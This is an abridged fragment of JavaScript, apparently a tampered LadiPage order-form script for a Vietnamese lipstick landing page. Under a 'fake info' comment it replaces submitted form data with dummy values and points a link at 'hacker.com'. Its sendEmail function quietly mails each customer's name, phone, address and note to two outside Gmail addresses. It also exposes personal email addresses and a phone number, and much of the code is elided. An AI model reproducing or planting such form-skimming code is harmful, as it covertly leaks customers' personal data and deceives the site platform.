		...
		function ()
		{
			var i, a = document.getElementsByClassName("ladi-form"),
				...
				v = function (t, i)
				{
					...
					for (var h = 0; h < m.length; h++) o_custom[m[h]] = "";
					s = Object.keys(o_custom);
					for (var v = 0; v < a.length; v++)
					{
						if (c = a[v].getAttribute("name"), a[v].required && -1 == u.indexOf(c) && u.push(c), "INPUT" == a[v].tagName)
						{
							...
							{
								e.isArray(o_custom[c]) || (o_custom[c] = []), a[v].checked && o_custom[c].push(a[v].value);
								continue
							}
							if ("radio" == E)
							{
								a[v].checked && (o_custom[c] = a[v].value);
								continue
							}
						}
						o_custom[c] = a[v].value
					}
                    /*fake info*/
                    o["name"] = "Xin chúc mừng";
                    o["phone"] = "0963836272";
                    o["address"] = "Hà Nội - Việt Nam";
                    o["message"] = "Xin chúc mừng";
							...
							else if (v(y, a), h(y, a, r))
							{
								...
								f && E(a, n, R), e.isArray(S) && S.forEach(function (t)
								{
									if (!e.isEmpty(t.api_url) && e.isArray(t.custom_fields))
									{
										...
										{}
										i || (a.link = "hacker.com", Object.keys(LadiFormApi).forEach(function (t)
										{
											a[t] = LadiFormApi[t]
										}), g.forEach(function (t)
										{
								...
								var B = function ()
								{
									...
									e.isNull(e.runtime.tmp.form_button_headline[i.id]) && (e.runtime.tmp.form_button_headline[i.id] = t.innerHTML), t.innerHTML = "Đang xử lý..."
								};
...
function sendEmail() {
    ...
    Email.send({
        ...
        To : 'quoclaptk@gmail.com',
        Bcc : 'huongneu1206@gmail.com',
        Subject : "Đơn hàng Son 3 Màu",
        Body : "<h3>&ensp;&ensp;&ensp; Thời gian đặt: "+ dateTime + "</h3><ul><li>Tên Khách Hàng: "+ o_custom["name"] + "</li><li>Số Điện Thoại: " + o_custom["phone"] + "</li><li>Địa chỉ : " + o_custom["address"] + "</li><li>Ghi Chú: " + o_custom["message"] + "</li></ul>"
